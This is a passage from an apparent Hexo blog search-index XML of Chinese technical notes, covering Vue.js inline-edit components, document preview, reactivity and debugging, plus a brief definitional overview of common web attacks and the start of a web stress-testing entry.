<li><a href="https://juejin.cn/post/7175091663247769656" target="_blank" rel="noopener">Vue3响应式原理解析</a>,by liy1wen.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuejs内联编辑简单示例</title>
    <url>/2022/08/27/Vuejs%E5%86%85%E8%81%94%E7%BC%96%E8%BE%91%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h1 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h1><h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;app-container&quot;&gt;</span><br><span class="line">    &lt;div v-for&#x3D;&quot;field in fields&quot; :key&#x3D;&quot;field.id&quot; class&#x3D;&quot;editable-field&quot;&gt;</span><br><span class="line">      &lt;template v-if&#x3D;&quot;editedFieldId &#x3D;&#x3D;&#x3D; field.id&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; v-model&#x3D;&quot;field.value&quot; :ref&#x3D;&quot;&#96;field$&#123;field.id&#125;&#96;&quot; &#x2F;&gt;</span><br><span class="line">        &lt;button class&#x3D;&quot;btn&quot; @click.prevent&#x3D;&quot;toggleEdit&quot;&gt;</span><br><span class="line">          &lt;template&gt;Save&lt;&#x2F;template&gt;</span><br><span class="line">        &lt;&#x2F;button&gt;</span><br><span class="line">      &lt;&#x2F;template&gt;</span><br><span class="line">      &lt;template v-else&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;editable-text&quot;&gt;</span><br><span class="line">          &#123;&#123; field.value &#125;&#125;</span><br><span class="line">        &lt;&#x2F;span&gt;</span><br><span class="line">        &lt;button class&#x3D;&quot;btn&quot; @click.prevent&#x3D;&quot;toggleEdit(field.id)&quot;&gt;Edit&lt;&#x2F;button&gt;</span><br><span class="line">      &lt;&#x2F;template&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br></pre></td></tr></table></figure>

<h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default &#123;</span><br><span class="line">  name: &quot;InlineEdit&quot;,</span><br><span class="line">  props: &#123;&#125;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      editedFieldId: null,</span><br><span class="line">      fields: [</span><br><span class="line">        &#123;</span><br><span class="line">          id: 1,</span><br><span class="line">          value: &quot;Editable field 1&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          id: 2,</span><br><span class="line">          value: &quot;Editable field 2&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  created() &#123; &#125;,</span><br><span class="line">  mounted() &#123; &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">   toggleEdit(id) &#123;</span><br><span class="line">      if (id) &#123;</span><br><span class="line">        this.editedFieldId &#x3D; id;</span><br><span class="line">        this.$nextTick(() &#x3D;&gt; &#123;</span><br><span class="line">          if (this.$refs[&quot;field&quot; + id]) &#123;</span><br><span class="line">            this.$refs[&quot;field&quot; + id][0].focus();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        this.editedFieldId &#x3D; null;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h1><h2 id="html-1"><a href="#html-1" class="headerlink" title="html"></a>html</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">    &lt;input</span><br><span class="line">      type&#x3D;&quot;text&quot;</span><br><span class="line">      v-if&#x3D;&quot;edit&quot;</span><br><span class="line">      :value&#x3D;&quot;valueLocal&quot;</span><br><span class="line">      @blur&#x3D;&quot;onBlur($event)&quot;</span><br><span class="line">      @keyup.enter&#x3D;&quot;onKeyEnter($event)&quot;</span><br><span class="line"></span><br><span class="line">      v-focus</span><br><span class="line">    &#x2F;&gt;</span><br><span class="line">    &lt;span v-else @click&#x3D;&quot;edit &#x3D; true&quot;&gt;</span><br><span class="line">      &#123;&#123; valueLocal &#125;&#125;</span><br><span class="line">    &lt;&#x2F;span&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br></pre></td></tr></table></figure>

<h2 id="js-1"><a href="#js-1" class="headerlink" title="js"></a>js</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;ClickToEdit&quot;,</span><br><span class="line">  props: [&quot;value&quot;],</span><br><span class="line"></span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      edit: false,</span><br><span class="line">      valueLocal: this.value,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  watch: &#123;</span><br><span class="line">    value: function () &#123;</span><br><span class="line">      this.valueLocal &#x3D; this.value;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  directives: &#123;</span><br><span class="line">    focus: &#123;</span><br><span class="line">      inserted(el) &#123;</span><br><span class="line">        el.focus();</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  methods:&#123;</span><br><span class="line">    onBlur(ev)&#123;</span><br><span class="line">      this.valueLocal &#x3D; ev.target.value;</span><br><span class="line">      this.edit &#x3D; false;</span><br><span class="line">      this.$emit(&#39;input&#39;, this.valueLocal);</span><br><span class="line">    &#125;,</span><br><span class="line">    onKeyEnter(ev)&#123;</span><br><span class="line">      this.valueLocal &#x3D; ev.target.value;</span><br><span class="line">      this.edit &#x3D; false;</span><br><span class="line">      this.$emit(&#39;input&#39;, this.valueLocal);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://jsfiddle.net/yobyzal/gehtwxeo/" target="_blank" rel="noopener">Vue Inline edit</a>,by yobyzal.</li>
<li><a href="https://stackoverflow.com/questions/45991218/building-a-form-with-inline-editing" target="_blank" rel="noopener">Building a form with inline editing</a>,by stackoverflow.</li>
<li><a href="https://devrecipes.net/simple-inline-editable-fields-in-vue/" target="_blank" rel="noopener">Simple inline editable fields with Vue.js</a>,by devrecipes.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuejs多窗口布局方法</title>
    <url>/2022/10/10/Vuejs%E5%A4%9A%E7%AA%97%E5%8F%A3%E5%B8%83%E5%B1%80%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Golden Layout 是一个 Javascript 布局管理器，它使您能够在网页中布局组件并通过拖放重新排列它们。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/zaj121/p/16650652.html" target="_blank" rel="noopener">以golden-layout官方网站版本，用vue2.x 开发的多布局管理</a>,by 草莓沾奶豆腐.</li>
<li><a href="https://blog.csdn.net/qq_41999034/article/details/109079228" target="_blank" rel="noopener">vue 启动报错：TypeError: Cannot read property ‘range‘ of null</a>,by 进击de菜鸟.</li>
<li><a href="https://blog.csdn.net/qq_32687373/article/details/120468681" target="_blank" rel="noopener">import实现动态路由时不能使用变量的问题</a>,by 练习一下.</li>
<li><a href="http://golden-layout.com/" target="_blank" rel="noopener">golden layout version 1 doc</a>,by golden-layout.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuejs生成Doc文档示例</title>
    <url>/2022/08/27/Vuejs%E7%94%9F%E6%88%90Doc%E6%96%87%E6%A1%A3%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h1 id="文档生成"><a href="#文档生成" class="headerlink" title="文档生成"></a>文档生成</h1><p>请参考<a href="https://blog.51cto.com/u_14213614/5226127" target="_blank" rel="noopener">使用vue+docxtemplater导出word</a>。</p>
<h1 id="文档预览"><a href="#文档预览" class="headerlink" title="文档预览"></a>文档预览</h1><p>请参考<a href="https://juejin.cn/post/7087162603926978567" target="_blank" rel="noopener">docx-preview实现移动端word文件预览</a>。</p>
<h1 id="PDF预览"><a href="#PDF预览" class="headerlink" title="PDF预览"></a>PDF预览</h1><p>使用docx-preview的文档预览方案不够完善，显示不够完美，因此采用后端使用docxtemplater文档生成，再使用libreoffice-convert转换成pdf，再下载到前端使用pdfjs预览pdf的方案。</p>
<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><ul>
<li>nodejs: v12.18.4</li>
<li>express: “^4.18.2”</li>
<li>docxtemplater: “^3.36.1”</li>
<li>libreoffice-convert: “^1.4.1”</li>
<li>spark-md5: “^3.0.2”</li>
<li>pdfjs: 2.16.105</li>
</ul>
<p><strong>注意：在使用libreoffice-convert将docx转换成pdf之前，需要安装libre office软件，使用默认配置安装。</strong></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.51cto.com/u_14213614/5226127" target="_blank" rel="noopener">使用vue+docxtemplater导出word</a>,by 实迷途其未远.</li>
<li><a href="https://juejin.cn/post/7090061215057051679" target="_blank" rel="noopener">详细|vue中使用PDF.js预览文件实践</a>,by 灵扁扁.</li>
<li><a href="https://juejin.cn/post/7087162603926978567" target="_blank" rel="noopener">docx-preview实现移动端word文件预览</a>,by LXLong.</li>
<li><a href="https://juejin.cn/post/6909252620741787656" target="_blank" rel="noopener">vue项目，npm install方式使用pdfjs</a>,by 下一秒.</li>
<li><a href="https://kalacloud.com/blog/how-build-vuejs-pdf-viewer-pdfjs/" target="_blank" rel="noopener">Vue 实现 PDF 文件在线预览 - 手把手教你写 Vue PDF 预览功能</a>,by 蒋川.</li>
<li><a href="https://blog.csdn.net/xinlingdexueba/article/details/79555678" target="_blank" rel="noopener">PDF.js访问远程服务器报file origin does not match viewer’s</a>,by 心灵的学霸.</li>
<li><a href="https://www.cnblogs.com/candlia/p/11919885.html" target="_blank" rel="noopener">深入理解xhr responseType blob arrayBuffer document text json使用</a>,by 柚子=_=.</li>
<li><a href="https://blog.csdn.net/weixin_53312997/article/details/124794126" target="_blank" rel="noopener">【实战分享】js生成word(docx)，以及将word转成pdf解决方案分享</a>,by 前端开发小陈.</li>
<li><a href="https://stackoverflow.com/questions/64811076/libreoffice-convert-not-working-in-nodejs" target="_blank" rel="noopener">libreoffice-convert not working in nodejs</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue响应式原理分析</title>
    <url>/2023/01/31/Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="Vue2与Vue3响应式原理的区别"><a href="#Vue2与Vue3响应式原理的区别" class="headerlink" title="Vue2与Vue3响应式原理的区别"></a>Vue2与Vue3响应式原理的区别</h1><ul>
<li>Vue2的响应式是基于Object.defineProperty实现的</li>
<li>Vue3的响应式是基于ES6的Proxy来实现的</li>
</ul>
<p>具体详情请参考<a href="https://juejin.cn/post/7001999813344493581" target="_blank" rel="noopener">Vue3的响应式原理？一篇文章，八张图，三心为你解密~</a>，<a href="https://juejin.cn/post/7175091663247769656" target="_blank" rel="noopener">Vue3响应式原理解析</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://juejin.cn/post/7001999813344493581" target="_blank" rel="noopener">Vue3的响应式原理？一篇文章，八张图，三心为你解密~</a>,by Sunshine_Lin.</li>
<li><a href="https://juejin.cn/post/7175091663247769656" target="_blank" rel="noopener">Vue3响应式原理解析</a>,by liy1wen.</li>
<li><a href="https://www.zhangxinxu.com/wordpress/2021/07/js-proxy-reflect/" target="_blank" rel="noopener">Proxy是代理，Reflect是干嘛用的？</a>,by 张鑫旭.</li>
<li><a href="https://www.runoob.com/w3cnote/es6-reflect-proxy.html" target="_blank" rel="noopener">3.1.2 ES6 Reflect 与 Proxy</a>,by runoob.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuejs调试入门</title>
    <url>/2019/07/28/Vuejs%E8%B0%83%E8%AF%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>每个应用，不论大小，都需要理解程序是如何运行失败的。下面将探讨调试浏览器中运行的通过 Vue CLI 生成的 Vue.js 应用程序。</p>
<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ul>
<li>Chrome </li>
<li>Vue CLI</li>
<li>Vue Devtools</li>
</ul>
<h1 id="浏览器中展示源代码"><a href="#浏览器中展示源代码" class="headerlink" title="浏览器中展示源代码"></a>浏览器中展示源代码</h1><p>在可以从 VS Code 调试你的 Vue 组件之前，你需要更新 webpack 配置以构建 source map。做了这件事之后，我们的调试器就有机会将一个被压缩的文件中的代码对应回其源文件相应的位置。这会确保你可以在一个应用中调试，即便你的资源已经被 webpack 优化过了也没关系。</p>
<p>打开 config/index.js 并找到 devtool 属性。将其更新为：</p>
<p>如果你使用的是 Vue CLI 2，请设置并更新 config/index.js 内的 devtool 属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">devtool: &#39;source-map&#39;,</span><br></pre></td></tr></table></figure>

<p>如果你使用的是 Vue CLI 3，请设置并更新 vue.config.js 内的 devtool 属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">  configureWebpack: &#123;</span><br><span class="line">    devtool: &#39;source-map&#39;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h1><h2 id="在Chrome浏览器中调试"><a href="#在Chrome浏览器中调试" class="headerlink" title="在Chrome浏览器中调试"></a>在Chrome浏览器中调试</h2><p>利用Chrome浏览器的开发工具，在Vuejs应用源代码中设置断点，进行调试。</p>
<p align="center">
    <img src="images/debug.jpg" width="100%" alt="在Chrome浏览器中调试"/>
</p>
<center>图1 在Chrome浏览器中调试</center>

<h2 id="简单的-debugger-语句"><a href="#简单的-debugger-语句" class="headerlink" title="简单的 debugger 语句"></a>简单的 debugger 语句</h2><p>可以直接在代码中使用原生的 debugger 语句。如果你选择了这种方式，请千万记得当你调试完毕之后把这个语句移除。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      message: &#39;&#39;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    const hello &#x3D; &#39;Hello World!&#39;</span><br><span class="line">    debugger</span><br><span class="line">    this.message &#x3D; hello</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cn.vuejs.org/v2/cookbook/debugging-in-vscode.html" target="_blank" rel="noopener">在 VS Code 中调试</a>,by vuejs.</li>
<li><a href="https://blog.csdn.net/m0_48355180/article/details/119961302" target="_blank" rel="noopener">下载并安装vue-devtools（详细步骤）</a>,by 鲤鱼砸龙门.</li>
<li><a href="https://zhuanlan.zhihu.com/p/142411207" target="_blank" rel="noopener">vue调试工具vue-devtools的安装</a>,by web前端.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全攻防技术探讨</title>
    <url>/2018/12/22/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E6%8E%A2%E8%AE%A8/</url>
    <content><![CDATA[<p>网络安全（英语：network security）包含网络设备安全、网络信息安全、网络软件安全。在此重点探讨网络软件安全中的Web安全。当前Web安全面临的压力越来越大，一方面是Web应用一统江湖，君临天下，另一方面针对Web应用的攻击越来越多，攻击方法越来越成熟。下面重点介绍常见的Web攻击方法。</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS (Cross Site Script，跨站脚本攻击)的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。</p>
<h2 id="非持久型-XSS"><a href="#非持久型-XSS" class="headerlink" title="非持久型 XSS"></a>非持久型 XSS</h2><h2 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h2><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-Site Request Forgery,跨站请求伪造攻击）可以盗用你的登陆信息，以你的身份模拟发送各种请求。</p>
<h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p>SQL 注入漏洞（SQL Injection）是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p>
<h1 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a>命令行注入</h1><p>命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令。</p>
<h1 id="DDoS-攻击"><a href="#DDoS-攻击" class="headerlink" title="DDoS 攻击"></a>DDoS 攻击</h1><p>DDoS 又叫分布式拒绝服务，全称 Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用。</p>
<h2 id="网络层-DDoS"><a href="#网络层-DDoS" class="headerlink" title="网络层 DDoS"></a>网络层 DDoS</h2><h2 id="应用层-DDoS"><a href="#应用层-DDoS" class="headerlink" title="应用层 DDoS"></a>应用层 DDoS</h2><h1 id="流量劫持"><a href="#流量劫持" class="headerlink" title="流量劫持"></a>流量劫持</h1><p>流量劫持是黑产行业的一大经济支柱。</p>
<h2 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h2><h2 id="HTTP-劫持"><a href="#HTTP-劫持" class="headerlink" title="HTTP 劫持"></a>HTTP 劫持</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.georgovassilis.com/2016/04/16/advanced-web-security-topics/" target="_blank" rel="noopener">Advanced web security topics</a>,by George.</li>
<li><a href="https://zh.wikipedia.org/wiki/网络安全" target="_blank" rel="noopener">网络安全</a>,by wikipedia.</li>
<li><a href="https://zoumiaojiang.com/article/common-web-security/" target="_blank" rel="noopener">常见 Web 安全攻防总结</a>,by zoumiaojiang.</li>
<li><a href="https://cjting.me/2020/03/13/rsa/" target="_blank" rel="noopener">RSA 的原理与实现</a>,by cjting.</li>
<li><a href="https://mp.weixin.qq.com/s/_kObp0peUyajqnDACJDlqg" target="_blank" rel="noopener">暗网取证研究</a>,by 苏再添.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSocket协议分析方法</title>
    <url>/2021/10/13/WebSocket%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://docs.qq.com/doc/DSGFuRUhSZEZzZWRo" target="_blank" rel="noopener">AG通过WSS协议实现自动化分析</a>,by qq.</li>
<li><a href="https://blog.ihomura.cn/2018/05/14/Bilibili%E7%9B%B4%E6%92%AD%E5%BC%B9%E5%B9%95%E6%8A%93%E5%8F%96-1-WebSocket/" target="_blank" rel="noopener">Bilibili 直播弹幕抓取 (1):WebSocket</a>,by 澪同学.</li>
<li><a href="https://blog.ihomura.cn/2018/05/15/Bilibili%E7%9B%B4%E6%92%AD%E5%BC%B9%E5%B9%95%E6%8A%93%E5%8F%96-2-Fiddler%E4%B8%8EWireShark/" target="_blank" rel="noopener">Bilibili 直播弹幕抓取 (2):Fiddler 与 WireShark</a>,by 澪同学.</li>
<li><a href="https://blog.ihomura.cn/2018/05/17/Bilibili%E7%9B%B4%E6%92%AD%E5%BC%B9%E5%B9%95%E6%8A%93%E5%8F%96-3-%E5%BC%B9%E5%B9%95%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Bilibili 直播弹幕抓取 (3): 弹幕传输协议分析</a>,by 澪同学.</li>
<li><a href="https://www.jianshu.com/p/c39e09051366" target="_blank" rel="noopener">Burpsuit注册机使用时报错java.math.MutableBigInteger.inverseMod64(J)J</a>,by 云勺.</li>
<li><a href="https://t0data.gitbooks.io/burpsuite/content/" target="_blank" rel="noopener">Burp Suite 实战指南</a>,by <a href="mailto:t0data@hotmail.com">t0data@hotmail.com</a>.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Web服务器端API响应体的设计</title>
    <url>/2022/07/22/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AFAPI%E5%93%8D%E5%BA%94%E4%BD%93%E7%9A%84%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<p>后端返回给前端一般用JSON方式，其响应体内容可定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">response&#x3D;&#123;</span><br><span class="line">    code: 200,</span><br><span class="line">    message:&#39;成功&#39;,</span><br><span class="line">    data: Object</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>code的设计可参考http请求返回的状态码。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/Shangxingya/article/details/122698648" target="_blank" rel="noopener">艺术~如何设计一套优秀的API响应体</a>,by Listen-Y.</li>
<li><a href="https://www.jhelp.net/p/5Ox3a2De3TCvOLzE" target="_blank" rel="noopener">API设计系列（二）：如何设计一个标准的返回结构的API接口呢？</a>,by 天蓝色.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuejs学习笔记</title>
    <url>/2021/05/10/Vuejs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>在使用Vuejs开发的过程中，遇到了一些技术问题，在此记录一下。</p>
<h1 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h1><p>作为响应式的开发框架，vuejs组件的data选项中元素将会被修改。vuejs将使用 ES5 的 Object.defineProperty函数修改 data 选项中的元素，使之成为响应式对象。 注意，在保存这些对象时，应该去掉其多余的用于响应的属性，可以采用如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">observeProp&#x3D;JSON.parse(JSON.stringify(observeProp))</span><br></pre></td></tr></table></figure>

<h1 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h1><p>注意Array.forEach方法通常情况下不会改变数据元素的值。</p>
<h1 id="Vue实例方法与全局API"><a href="#Vue实例方法与全局API" class="headerlink" title="Vue实例方法与全局API"></a>Vue实例方法与全局API</h1><p>vue实例方法：vm.$set、vm.$del、vm.$nextTick等，挂在Vue.prototype上的方法。</p>
<p>全局API： Vue.directive、Vue.filter、Vue.component等，挂在Vue构造函数上的方法。</p>
<h1 id="ElementUI切换暗黑主题"><a href="#ElementUI切换暗黑主题" class="headerlink" title="ElementUI切换暗黑主题"></a>ElementUI切换暗黑主题</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i -D element-theme-dark</span><br><span class="line"># Then, in code</span><br><span class="line">import &#39;element-theme-dark&#39;;</span><br></pre></td></tr></table></figure>

<p>具体请参考：</p>
<ul>
<li><a href="https://github.com/Arattian/element-theme-dark" target="_blank" rel="noopener">Element UI dark theme</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://segmentfault.com/a/1190000014107100" target="_blank" rel="noopener">javascript对象的浅拷贝、深拷贝和Object.assign方法浅析</a>,by 侯贝贝.</li>
<li><a href="https://blog.csdn.net/qq_21358931/article/details/79486133" target="_blank" rel="noopener">js 对象克隆的三种方式</a>,by 加了白糖的老干妈.</li>
<li><a href="https://blog.fundebug.com/2019/03/11/4-ways-to-loop-array-inj-javascript/" target="_blank" rel="noopener">JavaScript 的 4 种数组遍历方法： for VS forEach() VS for/in VS for/of</a>,by Fundebug.</li>
<li><a href="https://blog.csdn.net/ZhengKehang/article/details/81281563" target="_blank" rel="noopener">forEach究竟能不能改变数组的值</a>,by ZhengKehang.</li>
<li><a href="https://ustbhuangyi.github.io/vue-analysis/v2/prepare/" target="_blank" rel="noopener">Vue.js 技术揭秘</a>,by ustbhuangy.</li>
<li><a href="https://juejin.cn/post/6976157870014332935" target="_blank" rel="noopener">15 张前端高清知识地图，强烈建议收藏</a>,by 望道同学.</li>
<li><a href="https://segmentfault.com/a/1190000007434923" target="_blank" rel="noopener">理解Object.defineProperty的作用</a>,by 戎马.</li>
<li><a href="https://www.cnblogs.com/houxianzhou/p/16015947.html" target="_blank" rel="noopener">vue3 区别于 vue2 的“与众不同”</a>,by 喆星高照.</li>
<li><a href="https://blog.csdn.net/qq_36259513/article/details/104718072" target="_blank" rel="noopener">解析vue2.x源码之vue实例方法与全局API</a>,by 前端小白 - GavinWu.</li>
<li><a href="https://github.com/Arattian/element-theme-dark" target="_blank" rel="noopener">Element UI dark theme</a>,by Arattian.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>Web应用压力测试方法</title>
    <url>/2019/11/12/Web%E5%BA%94%E7%94%A8%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Web应用在部署前，最好进行压力测试，以衡量其是否达到设计指标，判断其在何种极限条件下应用功能会失效。下面即介绍软件测试中压力测试，尤其是Web应用压力测试的相关知识。</p>
<h1 id="压力测试"><a href="#压力测试" class="headerlink" title="压力测试"></a>压力测试</h1><p>压力测试（英语：Stress testing）是针对特定系统或是组件，为要确认其稳定性而特意进行的严格测试。会让系统在超过正常使用条件下运作，然后再确认其结果。进行压力测试的原因可能包括：</p>
<ul>
<li>确认系统在什么条件下会损坏，以及安全使用条件。</li>
<li>确认预测系统在什么条件下会损坏或其安全使用条件的数学模型是否准确。</li>
<li>确认是否符合预期的规格。</li>
<li>确认失效原因。</li>
<li>确认系统在正常工作条件以外，是否可以正常运作。</li>
</ul>
<p>软件测试中的压力测试是在超过正常运作条件以外的条件下运作系统，以确认健壮性的方式。压力测试对于关键任务软件格外的重要，但可以适用于各种的软件。压力测试一般较强调软件在高负载下的健壮性、可用性及异常处理，以及哪些在一般使用环境下算是正常行为。</p>
<p>例如一个网站设计容量是100个人同时点击，压力测试就要是采用120个同时点击的条件测试。</p>
<h1 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h1><p>web应用的性能指标主要有响应时间，吞吐量，并发量，性能计数器。</p>
<h2 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h2><p>响应时间指应用执行一个操作需要的时间，即从发出请求到最后收到响应数据所需要的时间。例如：打开一个网站的响应时间、数据库查询一条记录（有索引）的响应时间等等。</p>
<p>实践中通常采用的办法是重复请求，比如一个请求操作重复执行1万次，测试一万次执行的总响应时间之和，然后除以1万，就得到单次请求的响应时间。</p>
<h2 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h2><p>吞吐量指单位时间内系统处理的请求数量，体现系统的整体处理能力。对于网站，可用“请求数/秒”、“页面数/秒”或“访问人数/天”、“处理业务数/小时”等来衡量。重要指标有TPS(每秒处理的事物数)、QPS(每秒查询的请求数)、HPS（每秒HTTP请求数）等。</p>
<h2 id="并发量"><a href="#并发量" class="headerlink" title="并发量"></a>并发量</h2><p>并发量指系统能够同时处理的请求的数目，这个数字反映了系统的负载性能。对于网站而言，并发数指网站用户同时提交请求的用户数目。</p>
